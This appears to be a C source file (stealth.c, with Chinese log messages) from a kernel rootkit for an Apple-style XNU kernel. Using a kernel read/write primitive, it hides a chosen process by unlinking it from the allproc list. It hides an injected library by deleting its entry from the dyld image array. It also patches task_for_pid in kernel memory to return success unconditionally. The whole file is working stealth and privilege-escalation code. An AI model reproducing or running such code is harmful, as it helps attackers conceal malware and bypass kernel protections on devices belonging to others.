/* stealth.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include "stealth.h"

static uint64_t parse_hex(const char *s)
{
	if (!s) return 0;
	while (*s && isspace((unsigned char)*s)) s++;
	if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
	return strtoull(s, NULL, 16);
}

int offsets_load(const char *path, struct kern_offsets *o)
{
	FILE *f = fopen(path, "r");
	char line[256];

	if (!f) {
		fprintf(stderr, "[off] 打不开 %s\n", path);
		return -1;
	}
	while (fgets(line, sizeof(line), f)) {
		char *eq = strchr(line, '=');
		char *k = line, *v;
		char *nl;
		if (!eq) continue;
		*eq = 0;
		v = eq + 1;
		nl = strchr(v, '\n');
		if (nl) *nl = 0;
		while (*k && isspace((unsigned char)*k)) k++;

		if (!strcmp(k, "proc_list_next")) o->proc_list_next = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "proc_list_prev")) o->proc_list_prev = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "proc_pid")) o->proc_pid = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "proc_comm")) o->proc_comm = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "task_proc")) o->task_proc = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "dyld_infos_count")) o->dyld_infos_count = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "dyld_infos_array")) o->dyld_infos_array = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "dyld_image_size")) o->dyld_image_size = (uint32_t)parse_hex(v);
		else if (!strcmp(k, "dyld_image_path")) o->dyld_image_path = (uint32_t)parse_hex(v);
	}
	fclose(f);

	if (!o->proc_list_next || !o->proc_pid || !o->dyld_image_size) {
		fprintf(stderr, "[off] offsets 不完整，先按内核版本填好\n");
		return -1;
	}
	printf("[off] proc: next=%u prev=%u pid=%u comm=%u\n",
	       o->proc_list_next, o->proc_list_prev, o->proc_pid, o->proc_comm);
	return 0;
}

int kern_patch_verified(krw_ctx *c, uint64_t addr,
			const void *expect, const void *patch, size_t len, int dry)
{
	unsigned char cur[64], want[64];
	size_t i;

	if (len > sizeof(cur)) return -1;
	if (krw_read(c, addr, cur, len) != 0) {
		fprintf(stderr, "[patch] 读 0x%llx 失败\n", (unsigned long long)addr);
		return -1;
	}
	memcpy(want, expect, len);
	if (memcmp(cur, want, len) != 0) {
		printf("[patch] 0x%llx 原字节不符，放弃\n  cur: ", (unsigned long long)addr);
		for (i = 0; i < len; i++) printf("%02x ", cur[i]);
		printf("\n  exp: ");
		for (i = 0; i < len; i++) printf("%02x ", want[i]);
		printf("\n");
		return -1;
	}
	printf("[patch] 0x%llx ", (unsigned long long)addr);
	for (i = 0; i < len; i++) printf("%02x->%02x ", cur[i], ((const unsigned char *)patch)[i]);
	printf("\n");

	if (dry) return 0;
	if (krw_write(c, addr, patch, len) != 0) {
		fprintf(stderr, "[patch] 写失败\n");
		return -1;
	}
	return 0;
}

int stealth_hide_dylib(krw_ctx *c, const struct kern_offsets *o,
		       uint64_t infos_va, const char *needle, int dry)
{
	uint32_t count = 0;
	uint64_t array = 0;
	uint64_t entry_va, path_ptr, path_va;
	char path[512];
	uint32_t i, hit = 0xFFFFFFFFu;
	uint64_t last_off, hit_off;

	if (!infos_va || !o->dyld_image_size) return -1;

	krw_read(c, infos_va + o->dyld_infos_count, &count, 4);
	krw_read(c, infos_va + o->dyld_infos_array, &array, 8);
	printf("[dyld] infos=0x%llx count=%u array=0x%llx\n",
	       (unsigned long long)infos_va, count, (unsigned long long)array);
	if (!count || !array || count > 10000) return -1;

	for (i = 0; i < count; i++) {
		entry_va = array + (uint64_t)i * o->dyld_image_size;
		krw_read(c, entry_va + o->dyld_image_path, &path_ptr, 8);
		if (!path_ptr) continue;
		memset(path, 0, sizeof(path));
		if (krw_read(c, path_ptr, path, sizeof(path) - 1) != 0) continue;
		if (strstr(path, needle)) {
			hit = i;
			printf("[dyld] 命中 index=%u path=%s\n", i, path);
			break;
		}
	}
	if (hit == 0xFFFFFFFFu) {
		printf("[dyld] 没找到 %s（可能已经摘过）\n", needle);
		return 0;
	}

	/* 用最后一项覆盖命中项，再 count-1 */
	last_off = (uint64_t)(count - 1) * o->dyld_image_size;
	hit_off  = (uint64_t)hit * o->dyld_image_size;
	{
		unsigned char last[64], zero[64];
		memset(zero, 0, sizeof(zero));
		if (o->dyld_image_size > sizeof(last)) {
			fprintf(stderr, "[dyld] image_size 太大\n");
			return -1;
		}
		krw_read(c, array + last_off, last, o->dyld_image_size);
		if (dry) {
			printf("[dyld] dry-run：会把 index %u 换成 index %u，count %u -> %u\n",
			       hit, count - 1, count, count - 1);
			return 0;
		}
		if (krw_write(c, array + hit_off, last, o->dyld_image_size) != 0) return -1;
		if (krw_write(c, array + last_off, zero, o->dyld_image_size) != 0) return -1;
		count -= 1;
		if (krw_write(c, infos_va + o->dyld_infos_count, &count, 4) != 0) return -1;
	}
	printf("[dyld] 已摘链，剩余 %u 个镜像\n", count);
	return 0;
}

static uint64_t proc_field(krw_ctx *c, uint64_t proc, uint32_t off)
{
	uint64_t v = 0;
	krw_read(c, proc + off, &v, 8);
	return v;
}

static int proc_pid_at(krw_ctx *c, const struct kern_offsets *o, uint64_t proc)
{
	int32_t pid = 0;
	krw_read(c, proc + o->proc_pid, &pid, 4);
	return pid;
}

int stealth_hide_proc(krw_ctx *c, const struct kern_offsets *o,
		      uint64_t allproc, int pid, int dry)
{
	uint64_t cur, next, prevp, prev, target = 0;
	int guard = 0;

	if (!allproc) {
		fprintf(stderr, "[proc] allproc 符号没解析到\n");
		return -1;
	}
	krw_read(c, allproc, &cur, 8);
	while (cur && guard++ < 100000) {
		if (proc_pid_at(c, o, cur) == pid) { target = cur; break; }
		cur = proc_field(c, cur, o->proc_list_next);
	}
	if (!target) {
		printf("[proc] allproc 里没有 pid=%d\n", pid);
		return 0;
	}

	next  = proc_field(c, target, o->proc_list_next);
	prevp = proc_field(c, target, o->proc_list_prev);
	if (!prevp) return -1;
	krw_read(c, prevp, &prev, 8);

	printf("[proc] 命中 proc=0x%llx pid=%d next=0x%llx prev=0x%llx\n",
	       (unsigned long long)target, pid,
	       (unsigned long long)next, (unsigned long long)prev);

	if (dry) return 0;

	if (krw_write(c, prevp, &next, 8) != 0) return -1;
	if (next) {
		if (krw_write(c, next + o->proc_list_prev, &prevp, 8) != 0) return -1;
	}
	printf("[proc] 已从 allproc 摘链\n");
	return 0;
}

int stealth_task_for_pid_open(krw_ctx *c, int dry)
{
	uint64_t fn = krw_sym(c, "task_for_pid");
	unsigned char expect[8], patch[8] = { 0x00, 0x00, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6 };

	if (!fn) {
		fprintf(stderr, "[tfpid] 拿不到 task_for_pid 地址（后端没有 ksym）\n");
		return -1;
	}
	/* mov w0, #0 ; ret */
	if (krw_read(c, fn, expect, 8) != 0) return -1;
	printf("[tfpid] task_for_pid=0x%llx 原字节 %02x %02x %02x %02x\n",
	       (unsigned long long)fn, expect[0], expect[1], expect[2], expect[3]);
	return kern_patch_verified(c, fn, expect, patch, 8, dry);
}
